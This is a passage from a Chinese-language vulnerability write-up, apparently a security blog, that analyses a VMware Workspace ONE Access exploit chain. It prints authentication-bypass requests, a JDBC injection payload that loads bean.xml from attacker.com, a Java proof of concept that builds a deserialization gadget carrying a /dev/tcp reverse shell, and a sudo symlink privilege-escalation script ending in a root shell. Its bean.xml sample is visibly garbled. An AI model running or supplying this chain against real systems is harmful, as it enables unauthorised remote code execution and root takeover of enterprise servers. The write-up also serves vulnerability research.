   public String checkConnection(@Nonnull String jdbcUrl, @Nonnull String username, @Nonnull String password, boolean checkCreateTableAccess) throws PersistenceRuntimeException {
     connection = null;
     String driverVersion = null;
     try {
       loadDriver(jdbcUrl);
       connection = testConnection(jdbcUrl, username, password, checkCreateTableAccess); 
       meta = connection.getMetaData();
       driverVersion = meta.getDriverVersion();
     } catch (SQLException e) {
       log.error("connectionFailed");
       throw new PersistenceRuntimeException(e.getMessage(), e);
     } finally {
       try {
         if (connection != null) {
           connection.close();
         }
       } catch (Exception e) {
         log.warn("Problem closing connection", e);
       }
     }
     return driverVersion;
   }

```  
  
接着可控的jdbcUrl将作为参数传入testConnection方法进行调用，跟进:  
```
private Connection testConnection(String jdbcUrl, String username, String password, boolean checkCreateTableAccess) throws PersistenceRuntimeException {
     try {
       Connection connection = this.factoryHelper.getConnection(jdbcUrl, username, password); 
       log.info("sql verification triggered");
       this.factoryHelper.sqlVerification(connection, username, Boolean.valueOf(checkCreateTableAccess));

       if (checkCreateTableAccess) {
         return testCreateTableAccess(jdbcUrl, connection);
       }
       return testUpdateTableAccess(connection);
     }

```  
  
然后同样作为参数调用了FactoryHelper.getConnection()方法，跟进：  
```
public Connection getConnection(String jdbcUrl, String username, String password) throws SQLException {
       try {
         return DriverManager.getConnection(jdbcUrl, username, password); 
       } catch (Exception ex) {
         if (ex.getCause() != null && ex.getCause().toString().contains("javax.net.ssl.SSLHandshakeException")) {
           log.info(String.format("ssl handshake failed for the user:%s ", new Object[] { username }));
           throw new SQLException("database.connection.ssl.notSuccess");
         }
         log.info(String.format("Connection failed for the user:%s ", new Object[] { username }));
         throw new SQLException("database.connection.notSuccess");
       }
     }

```  
  
最后，到达DriverManager.getConnection()方法，并进行远程连接，也就导致了这里存在JDBC注入漏洞。  
  
利用JDBC注入，可以做到什么危害呢？当然最容易想到的就是JDBC反序列化RCE了，这块在后面的漏洞组合利用再一起介绍。  
  
  
**3.3.3 漏洞3：publishCaCert.hzn 和 gatherConfig.hzn 提权**  
  
****  
通过漏洞2进行RCE后可以通过这个漏洞进行提权，实际上利用的是sudo提权，sodu 全称 Substitute User and Do，用来临时赋予root权限运行某个程序。  
  
  
sodu 的执行原理：普通用户执行命令时，首先检查/var/run/sudo/目录下是否有用户时间戳，centos检查/var/db/sudo/目录，并检查是否过期。如果时间戳过期，就需要输入当前用户的密码。输入后检查/etc/sudoers配置文件，查看用户是否有sudo权限，如果有执行sudo命令并返回结果，然后退出sudo返回到普通用户的shell环境。  
  
  
sudo -l列出当前用户可以执行的命令:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4XmuibPdxNxMuKuBt11RoBSDFLX3bTTm53lhCT3gictaeSsFl6zCbBjhw/640?wx_fmt=png "")  
  
这些脚本可以由Horizion 用户通过 root 权限执行，并且不需要使用 sudo 密码。Horizion用户无法编写这些脚本，因此需要利用这些脚本里面的代码漏洞来进行提权。  
  
  
**1. publishCaCert.hzn**  
```
#!/bin/sh
#Script to isolate sudo access to just publishing a single file to the trusted certs directory

CERTFILE=$1
DESTFILE=$(basename $2)

cp -f $CERTFILE /etc/ssl/certs/$DESTFILE // 1
chmod 644 /etc/ssl/certs/$DESTFILE // 2
c_rehash > /dev/null

```  
  
可以看到这个脚本可以通过命令行将一个文件复制到/etc/ssl/certs/目录下，然后使用chmod命令将那个文件设置为可读可写。  
  
  
**2. gatherConfig.hzn：**  
```
#!/bin/bash
#
# Minor: Copyright 2019 VMware, Inc. All rights reserved.
. /usr/local/horizon/scripts/hzn-bin.inc
. /usr/local/horizon/scripts/manageTcCfg.inc
DEBUG_FILE=$1

#...

function gatherConfig()
{
    printLines
    echo "1) cat /usr/local/horizon/conf/flags/sysconfig.hostname" > ${DEBUG_FILE}
    #...
    chown $TOMCAT_USER:$TOMCAT_GROUP $DEBUG_FILE 
}

if [ -z "$DEBUG_FILE" ]
then
    usage
else
    DEBUG_FILE=${DEBUG_FILE}/"debugConfig.txt"
    gatherConfig
fi

```  
  
这一步为了提权，我们可以利用创建一个名为 degugConfig.txt 的软链接指向具有root用户权限执行的文件，例如上面sudo -l中列出的certproxyService.sh脚本，从而执行这个gatherConfig.hzn时就可以配合脚本里gatherConfig函数中的chown命令进行提权。  
  
  
**3.3.4 漏洞组合利用RCE**  
  
****  
1.身份认证Bypass  
  
首先，我们需要拿到activationToken：  
  
请求包：  
```
POST /SAAS/API/1.0/REST/oauth2/generateActivationToken/Service__OAuth2Client HTTP/1.1
Host: photon-machine
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

```  
  
返回包：  
```
{
 "activationToken": "eyJvdGEiOiJiNmRlZmFkOS1iY2M3LTM3ZWUtYTdkZi05YTM2ZDcxZDU4MGE6c0dJcnlObEhxREVnUW...",
 "_links": {}
}

```  
  
然后使用activationToken获取 client _ id 和 client _ secret  
  
请求包：  
```
POST /SAAS/API/1.0/REST/oauth2/activate HTTP/1.1
Host: photon-machine
Content-Type: application/x-www-form-urlencoded
Content-Length: 168

eyJvdGEiOiJiNmRlZmFkOS1iY2M3LTM3ZWUtYTdkZi05YTM2ZDcxZDU4MGE6c0dJcnlObEhxREVnUW...

```  
  
返回包：  
```
{
 "client_id": "Service__OAuth2Client",
 "client_secret": "uYkAzg1woC1qbCa3Qqd0i6UXpwa1q00o"
}
```  
  
****  
**3. JDBC反序列化RCE**  
  
  
由于存在JDBC注入，所以可以通过 MySQL JDBC 驱动使用 autoSerialize 属性进行RCE。服务器将连接回攻击者的恶意 MySQL 服务器，然后可以传递任意序列化的 Java 对象，该对象可以在服务器上进行反序列化。打的话可以通过CommonsBeanutils1利用链进行攻击。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4ibE8rNb2IJhB4JNJOKx2qSxKMVHg3LCVm8SEiakAW7SfvvibZ8mU5PicQw/640?wx_fmt=png "")  
  
或者还可以通过PostgreSQL JDBC 驱动的 socketFactory 属性执行RCE。通过设置 socketFactory 和 socketFactoryArg 属性，攻击者可以触发任意 Java 类中定义的构造函数的执行，条件是该构造函数具有可控的字符串参数。所以可以构造如下poc：  
  
bean.xml:  
```
<beans xnlns="http://www.springframework.ar9/schema/beans"
xnlns:xsi="http://www.w3.0rg/2001/XMLSchema- iristance"
xsi:schenaLocat ion="http://www.springfiremefork.org/schema /beans http://www.Springframework.org/schema/beans /spring-beans.xsd">
<bean id="pb" class="Java.Lang.ProcessButlder" init-method="start">
<constructor-arg>
<list>
svalue>touch</value>
svalue>/tmp/rcevalue>
</list>
</constructo-arg>
</bean>
</beans>

```  
  
payload:  
  
jdbc:postgresql://si/saas?&socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext&socketFactoryArg=http://attacker.com:9090/bean.xml  
  
挂载在VPS上即可：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4K1IXlL634dMHPibuxLKTodrEriazaYmudT61GPm3uVb9ahFhhB32SHGQ/640?wx_fmt=png "")  
  
当然样的话就比较受出网限制，如果目标没法出网的情况下，还得思考下如何进一步改进利用，这里用到了com.vmware.licensecheck.LicenseChecker这个类：  
```
public LicenseChecker(final String s) {
        this(s, true);
    }
    public LicenseChecker(final String state, final boolean validateExpiration) {
        this._handle = new LicenseHandle();
        if (state != null) {
            this._handle.setState(state); 
        }
        this._validateExpiration = validateExpiration;
    }

```  
  
LicenseChecker的构造函数会调用另外一个重载构造函数LicenseChecker(final String state, final boolean validateExpiration),其中会调用到LicuseHandle 类上的 setState：  
```
 public void setState(String var1) {
        if (var1 != null && var1.length() >= 1) {
            try {
                byte[] var2 = MyBase64.decode(var1); // 3
                if (var2 != null && this.deserialize(var2)) { // 4
                    this._state = var1;
                    this._isDirty = false;
                }
            } catch (Exception var3) {
                log.debug(new Object[]{"failed to decode state: " + var3.getMessage()});
            }

        }
    }

```  
  
然后回对传入的可控参数先进行base64解码，然后调用了deserialize，跟进查看：  
```
private boolean deserialize(byte[] var1) {
        if (var1 == null) {
            return true;
        } else {
            try {
                ByteArrayInputStream var2 = new ByteArrayInputStream(var1);
                DataInputStream var3 = new DataInputStream(var2);
                int var4 = var3.readInt();
                switch(var4) {
                case -889267490:
                    return this.deserialize_v2(var3); 
                default:
                    log.debug(new Object[]{"bad magic: " + var4});
                }
            } catch (Exception var5) {
                log.debug(new Object[]{"failed to de-serialize handle: " + var5.getMessage()});
            }
            return false;
        }
    }

```  
  
这里读取base64解码后的字节的的一个int，如果为-889267490的话继续调用deserialize_v2方法：  
```
private boolean deserialize_v2(DataInputStream var1) throws IOException {
        byte[] var2 = Encrypt.readByteArray(var1);
        if (var2 == null) {
            log.debug(new Object[]{"failed to read cipherText"});
            return false;
        } else {
            try {
                byte[] var3 = Encrypt.decrypt(var2, new String(keyBytes_v2)); 
                if (var3 == null) {
                    log.debug(new Object[]{"failed to decrypt state data"});
                    return false;
                } else {
                    ByteArrayInputStream var4 = new ByteArrayInputStream(var3);
                    ObjectInputStream var5 = new ObjectInputStream(var4);
                    this._htEvalStart = (Hashtable)var5.readObject(); 
                    log.debug(new Object[]{"restored " + this._htEvalStart.size() + " entries from state info"});
                    return true;
                }
            } catch (Exception var6) {
                log.warn(new Object[]{var6.getMessage()});
                return false;
            }
        }
    }

```  
  
在这里先进行调用decrypt，并使用硬编码密钥keyBytes_v2解密字符串，然后对可控字符串调用 readObject进行反序列化。所以这里是通过JDBC URI注入去打LicenseChecker类中的反序列化，poc如下：  
```
import com.vmware.licensecheck.LicenseChecker;
import com.vmware.licensecheck.LicenseHandle;
import com.vmware.licensecheck.MyBase64;
import ysoserial.payloads.ObjectPayload.Utils;
import java.lang.reflect.Field;
import java.net.URLEncoder;
import java.util.Hashtable;
import java.io.*;

public class Poc {
    public static void main(String[] args) throws Exception {
        String shell = MyBase64.encode("bash -c \"bash -i >& /dev/tcp/10.0.0.1/1234 0>&1\"".getBytes());
        Object payload = Utils.makePayloadObject("CommonsBeanutils1", String.format("sh -c $@|sh . echo echo %s|base64 -d|bash", shell));
        LicenseChecker lc = new LicenseChecker(null);
        Field handleField = LicenseChecker.class.getDeclaredField("_handle");
        handleField.setAccessible(true);
        LicenseHandle lh = (LicenseHandle)handleField.get(lc);
        Field htEvalStartField = LicenseHandle.class.getDeclaredField("_htEvalStart");
        htEvalStartField.setAccessible(true);
        Field isDirtyField = LicenseHandle.class.getDeclaredField("_isDirty");
        isDirtyField.setAccessible(true);
        Hashtable<Integer, Object> ht = new Hashtable<Integer, Object>();
        ht.put(1337, payload);
        htEvalStartField.set(lh, ht);
        isDirtyField.set(lh, true);
        handleField.set(lc, lh);
        String payload = URLEncoder.encode(URLEncoder.encode(lc.getState(), "UTF-8"), "UTF-8");
        System.out.println(String.format("(+) jdbc:postgresql://si/saas?socketFactory=com.vmware.licensecheck.LicenseChecker%%26socketFactoryArg=%s", payload));
    }
}

```  
  
最终paylaod：  
  
jdbc:postgresql://si/saas?socketFactory=com.vmware.licensecheck.LicenseChecker%26socketFactoryArg=yv7a3gAACwQAxxxxxxxxxx  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4Gbciat3UYVoZicGuO47eWNYmOEvAkTAnuIsFJ4ibuxj7LEr0wD9s5Iwxg/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4JPyfQWlmL4ic2ATfQ7Ga9nODsHFIdo7fZL2P1LibbaB2VLvsl5z0oBYw/640?wx_fmt=png "")  
  
  
  
**3.提权**  
  
****  
在前文已经讲过，利用publishCaCert.hzn和gatherConfig.hzn 脚本中的代码可以进行对具有root权限的文件进行覆盖重写，进而进行提权，poc如下：  
  
```
sudo /usr/local/horizon/scripts/publishCaCert.hzn /opt/vmware/certproxy/bin/certproxyService.sh tmp
mkdir tmp
ln -s /opt/vmware/certproxy/bin/certproxyService.sh /tmp/debugConfig.txt
sudo /usr/local/horizon/scripts/gatherConfig.hzn tmp
rm -rf tmp
chmod 755 /opt/vmware/certproxy/bin/certproxyService.sh
echo "mv /etc/ssl/certs/tmp /opt/vmware/certproxy/bin/certproxyService.sh" > /opt/vmware/certproxy/bin/certproxyService.sh
echo "chown root:root /opt/vmware/certproxy/bin/certproxyService.sh" >> /opt/vmware/certproxy/bin/certproxyService.sh
echo "chmod 640 /opt/vmware/certproxy/bin/certproxyService.sh" >> /opt/vmware/certproxy/bin/certproxyService.sh
echo "rm /tmp/a; rm /tmp/b; cd /root; python -c 'import pty; pty.spawn(\\\"/bin/bash\\\")'" >> /opt/vmware/certproxy/bin/certproxyService.sh
sudo /opt/vmware/certproxy/bin/certproxyService.sh
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4whpwSVP7jK5mD6tM6A16s5Gxgibs3mPhDZwjoqDqnL7koFNbYl1c4Kg/640?wx_fmt=png "")  
  
#  Reference  
  
1.https://developer.aliyun.com/article/652873#slide-3  
  
2.https://www.anquanke.com/post/id/275266  
  
3.https://testbnull.medium.com/oracle-access-manager-pre-auth-rce-cve-2021-35587-analysis-1302a4542316  
  
4.https://github.com/sourceincite/hekate  
  
  
